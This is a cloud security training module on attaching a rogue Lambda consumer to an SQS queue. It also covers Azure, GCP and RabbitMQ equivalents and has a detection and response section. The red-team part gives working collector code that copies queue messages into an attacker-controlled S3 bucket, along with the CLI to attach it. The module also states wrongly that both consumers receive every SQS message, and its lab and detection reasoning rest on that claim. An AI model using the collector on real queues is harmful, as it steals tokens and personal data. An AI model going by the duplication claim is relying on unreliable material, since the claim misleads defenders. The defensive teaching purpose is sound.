# 04 — Lambda Event Source Mapping Abuse

> **Level:** Advanced
> **Prereqs:** [Serverless Function Security](serverless-function-security.md) (Serverless Function Security)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Persistence, Collection, Privilege Escalation
**Authorization scope:** All event source mappings created in your own sandbox account. Queue names and function ARNs use placeholder IDs (`111111111111`, `example.com`). Do not attach consumers to production queues.

## What & why

Event source mappings wire Lambda functions to message queues and streams (SQS, Kinesis, DynamoDB Streams). An attacker with `lambda:CreateEventSourceMapping` can attach a malicious consumer to an existing queue they don't own, silently harvesting every message — tokens, PII, internal commands. This is a persistent, stealthy collection mechanism that requires no modification to the queue itself.

## The OnPrem reality

A message queue consumer on-prem was a long-running daemon pulling from RabbitMQ or ActiveMQ. Adding an unauthorized consumer required either queue ACL modification or a rogue process binding to the broker — both visible to network monitoring. In serverless, the attachment is API-level and leaves minimal network footprint.

## Core concepts

| Component | Role | Attack vector |
|---|---|---|
| Event source | The queue/stream (SQS, Kinesis, DynamoDB) | Source ARN is the target — attacker does not need queue ownership |
| Event source mapping | The binding between source and Lambda | `lambda:CreateEventSourceMapping` creates a new consumer |
| Lambda consumer | The function that processes messages | Attacker controls the function code; can be a simple exfil function |
| DLQ | Dead letter queue for failed messages | Attacker may set a custom DLQ to capture poison-pill messages |
| Batch window | How many records per invocation | Tuning lets attacker control ingestion rate |

## AWS

**Primary services:** Lambda, SQS, Kinesis, DynamoDB Streams, EventBridge Pipes

**Minimal SQS → Lambda mapping (Terraform):**
```hcl
# AWS
resource "aws_lambda_event_source_mapping" "sqs_consumer" {
  event_source_arn = aws_sqs_queue.orders.arn
  function_name    = aws_lambda_function.processor.arn
  batch_size       = 10
  function_response_types = ["ReportBatchItemFailures"]
}

resource "aws_iam_role_policy" "lambda_sqs" {
  role = aws_iam_role.processor.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Action = [
        "sqs:ReceiveMessage",
        "sqs:DeleteMessage",
        "sqs:GetQueueAttributes"
      ]
      Resource = [aws_sqs_queue.orders.arn]
    }]
  })
}
```

**Attach mapping via CLI:**
```bash
# AWS
aws lambda create-event-source-mapping \
  --function-name order-processor \
  --event-source-arn arn:aws:sqs:us-east-1:111111111111:orders-queue \
  --batch-size 10 \
  --maximum-batching-window-in-seconds 5
```

**Required IAM for mapping creation (minimum):**
```json
{
  "Effect": "Allow",
  "Action": [
    "lambda:CreateEventSourceMapping",
    "lambda:GetEventSourceMapping",
    "lambda:UpdateEventSourceMapping"
  ],
  "Resource": "*"
}
```

Note: The `CreateEventSourceMapping` permission does not require `sqs:ReceiveMessage` on the IAM principal — only the Lambda execution role needs queue access. This means an attacker with only `lambda:*` can attach to any queue the function role has access to.

## Azure

**Primary services:** Functions, Service Bus, Event Grid, Event Hubs

**Service Bus trigger binding:**
```json
// Azure — function.json
{
  "bindings": [
    {
      "name": "orderMessage",
      "type": "serviceBusTrigger",
      "direction": "in",
      "queueName": "orders",
      "connection": "ServiceBusConnection"
    }
  ]
}
```

**CLI to enable Service Bus trigger:**
```bash
# Azure
az functionapp config appsettings set \
  --name func-processor --resource-group rg-sec \
  --settings "ServiceBusConnection__fullyQualifiedNamespace=sb-orders.example.com"
```

**Event Grid subscription (persistent event consumer):**
```bash
# Azure
az eventgrid event-subscription create \
  --name order-sub \
  --source-resource-id /subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-sec/providers/Microsoft.EventGrid/topics/orders \
  --endpoint /subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-sec/providers/Microsoft.Web/sites/func-processor/functions/ProcessOrder \
  --endpoint-type AzureFunction
```

## GCP

**Primary services:** Cloud Functions (2nd gen), Pub/Sub, Eventarc

**Pub/Sub trigger (Terraform):**
```hcl
# GCP
resource "google_cloudfunctions2_function" "processor" {
  name     = "order-processor"
  location = "us-central1"
  build_config {
    runtime     = "python312"
    entry_point = "process_order"
  }
  event_trigger {
    trigger_region = "us-central1"
    event_type     = "google.cloud.pubsub.topic.v1.messagePublished"
    pubsub_topic   = google_pubsub_topic.orders.id
    service_account_email = google_service_account.func_sa.email
  }
}
```

**Create trigger via CLI:**
```bash
# GCP
gcloud eventarc triggers create orders-trigger \
  --location=us-central1 \
  --destination-run-service=order-processor \
  --destination-run-region=us-central1 \
  --event-filters="type=google.cloud.pubsub.topic.v1.messagePublished" \
  --transport-topic=projects/my-sandbox-project/topics/orders
```

## OnPrem

On-Prem equivalent is a message queue consumer registering itself as a queue listener:

```python
# OnPrem
import pika

connection = pika.BlockingConnection(pika.ConnectionParameters('rabbitmq.example.com'))
channel = connection.channel()
channel.queue_declare(queue='orders')
channel.basic_consume(queue='orders', on_message_callback=process_order, auto_ack=True)
channel.start_consuming()
```

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Event source | RabbitMQ / ActiveMQ exchange | SQS queue / Kinesis stream / DynamoDB stream | Service Bus queue / Event Grid topic | Pub/Sub topic / Eventarc |
| Consumer attachment | AMQP `basic_consume` | `CreateEventSourceMapping` | Event subscription / function binding | Eventarc trigger |
| Permission to attach | Exchange write permission | `lambda:CreateEventSourceMapping` | `Microsoft.EventGrid/eventSubscriptions/write` | `eventarc.triggers.create` |
| Consumer identity | Username + password | Lambda execution role | Managed Identity / connection string | Service account |
| Visibility | Broker admin UI / metrics | CloudWatch ESM metrics | Event Grid metrics | Pub/Sub subscription metrics |

## 🔴 Red Team view

**Attack: Silent queue consumer attachment**

**Scenario:** An attacker has obtained credentials with `lambda:CreateEventSourceMapping` (commonly granted in dev roles via `AWSLambda_FullAccess`). The target application processes payment orders through SQS queue `orders-queue` in account `111111111111`. The attacker's goal is to read every order message without modifying the queue.

**Step 1 — Create a passive exfiltration Lambda:**
```python
# Attacker-controlled Lambda in same account
import boto3
import json
import os

s3 = boto3.client('s3')
EXFIL_BUCKET = os.environ.get('EXFIL_BUCKET', 'attacker-collector-bucket')

def handler(event, context):
    for record in event.get('Records', []):
        body = json.loads(record['body'])
        s3.put_object(
            Bucket=EXFIL_BUCKET,
            Key=f"harvested/{context.aws_request_id}.json",
            Body=json.dumps(body)
        )
    return {"statusCode": 200}
```

**Step 2 — Attach the Lambda as consumer:**
```bash
aws lambda create-event-source-mapping \
  --function-name passive-collector \
  --event-source-arn arn:aws:sqs:us-east-1:111111111111:orders-queue \
  --batch-size 10 \
  --enabled
```

**Step 3 — Verify messages are flowing:**
```bash
aws lambda get-event-source-mapping \
  --uuid a1b2c3d4-1111-2222-3333-000000000000
```

The attacker's Lambda now receives every message from the production queue alongside the legitimate consumer. Because SQS supports multiple consumers, neither the queue owner nor the legitimate consumer sees any disruption. The attacker harvests order data (tokens, user PII, internal commands) and writes it to an S3 bucket under their control.

**Persistence note:** The event source mapping survives Lambda redeployment and can be set `--enabled` after a period of dormancy. The mapping UUID is the only artifact linking the function to the queue — no modification to the SQS queue's own configuration.

**Artifacts left:**
- CloudTrail `CreateEventSourceMapping` with `eventSourceArn=arn:aws:sqs:...` and `functionArn=arn:aws:lambda:...passive-collector`
- CloudWatch metrics: `NumberOfMessagesReceived` split between two consumers (legitimate + attacker)
- S3 `PutObject` events in attacker-controlled bucket with message bodies
- Lambda invocation logs in CloudWatch showing message processing

## 🔵 Blue Team view

**Detection signals:**

| Signal | Log Source | Query |
|---|---|---|
| Unexpected `CreateEventSourceMapping` | CloudTrail | `eventName=CreateEventSourceMapping` from principal NOT in `ci/cd-role` group |
| ESM created with non-standard batch size | CloudTrail | Same event, check `requestParameters.batchSize` != expected values (10, 100) |
| New ESM on critical SQS queue | CloudTrail | `requestParameters.eventSourceArn` matches known production queues |
| Two consumers on same SQS queue | CloudWatch | `ApproximateNumberOfMessagesVisible` drops faster than single-consumer expected | (as of June 2026, compare per-queue `NumberOfMessagesDeleted` rate against a baseline of the expected single-consumer rate; a doubling suggests an additional consumer) |
| S3 writes from Lambda to unknown bucket | CloudTrail | `eventName=PutObject` with `userIdentity.arn` matching Lambda role, `resources.ARN` not in known output buckets |

**Preventive controls:**

- **AWS:** SCP denying `lambda:CreateEventSourceMapping` to all roles except the CI/CD pipeline role:
```json
{
  "Effect": "Deny",
  "Action": ["lambda:CreateEventSourceMapping"],
  "Resource": "*",
  "Condition": {
    "StringNotLike": {
      "aws:PrincipalArn": "arn:aws:iam::111111111111:role/build-pipeline-*"
    }
  }
}
```
- **Azure:** Azure Policy denying `Microsoft.EventGrid/eventSubscriptions/write` outside of managed identity; require Event Subscription creation via IaC pipeline only.
- **GCP:** IAM condition restricting `eventarc.triggers.create` to specific service accounts; Pub/Sub subscription IAM `roles/pubsub.subscriber` granted only to known consumer service accounts.
- **OnPrem:** RabbitMQ ACLs restrict `basic_consume` to a whitelist of service usernames; broker audit log monitors for unexpected consumers.

**Response steps:**
1. Delete the unauthorized event source mapping immediately: `aws lambda delete-event-source-mapping --uuid <uuid>`.
2. Revoke the IAM credentials used to create the mapping.
3. Audit all other event source mappings in the account for similar rogue attachments.
4. Review the attacker's Lambda code (download from console) and its CloudWatch logs to understand what was collected.
5. Notify data owners if messages contained PII or credentials.
6. Rotate all secrets/API keys that may have appeared in harvested messages.

## Hands-on lab

**Goal:** Create a legitimate SQS→Lambda mapping and then simulate detection of an unauthorized mapping.

**Steps:**
1. Create an SQS queue `orders-queue` and a Lambda `order-processor` with least-privilege role.
2. Create a legitimate event source mapping: `aws lambda create-event-source-mapping --function-name order-processor --event-source-arn <queue-arn>`.
3. Send a test message: `aws sqs send-message --queue-url <url> --message-body '{"orderId":"001"}'`.
4. Verify processor receives it via CloudWatch Logs.
5. Create a second Lambda `rogue-collector` that writes to a test S3 bucket.
6. Create a second event source mapping from the same queue to `rogue-collector`.
7. Send a second test message — both Lambdas receive it. Observe the message duplication.
8. Detect the rogue mapping: `aws lambda list-event-source-mappings --event-source-arn <queue-arn>`.
9. Delete rogue mapping, verify only `order-processor` remains.
10. Teardown: delete mappings, Lambdas, queue, S3 bucket.

**Expected output:** Both consumers receive the same message; `list-event-source-mappings` shows two entries for the same queue.

## Detection rules & checklists

**CloudTrail alert — unexpected event source mapping:**
```yaml
# CloudWatch Events pattern
{
  "source": ["aws.lambda"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventName": ["CreateEventSourceMapping"],
    "userIdentity": {
      "arn": [{ "anything-but": { "prefix": "arn:aws:iam::111111111111:role/build-pipeline" } }]
    }
  }
}
```

**CLI audit one-liners:**
```bash
# AWS: list all event source mappings (especially on critical queues)
aws lambda list-event-source-mappings \
  --query "EventSourceMappings[?EventSourceArn.contains(@,'orders')].{UUID:UUID,Function:FunctionArn}"

# AWS: check for multiple consumers on same queue
aws lambda list-event-source-mappings --event-source-arn arn:aws:sqs:us-east-1:111111111111:orders-queue

# Azure: list Event Grid subscriptions on a topic
az eventgrid topic event-subscription list \
  --resource-group rg-sec --topic-name orders \
  --query "[].{Name:name,Endpoint:destination.endpointUrl}"

# GCP: list Pub/Sub subscriptions for a topic
gcloud pubsub topics list-subscriptions projects/my-sandbox-project/topics/orders

# OnPrem: RabbitMQ consumer list
rabbitmqctl list_consumers | grep orders
```

## References
- AWS Lambda event source mappings: https://docs.aws.amazon.com/lambda/latest/dg/invocation-eventsourcemapping.html
- Azure Functions triggers and bindings: https://learn.microsoft.com/en-us/azure/azure-functions/functions-triggers-bindings
- GCP Eventarc: https://cloud.google.com/eventarc/docs
- ATT&CK: see Cloud matrix for "Collection" and "Persistence"
- Cross-links: [`03-03-serverless-function-security.md`](serverless-function-security.md), [`../IAM/`](../IAM/)
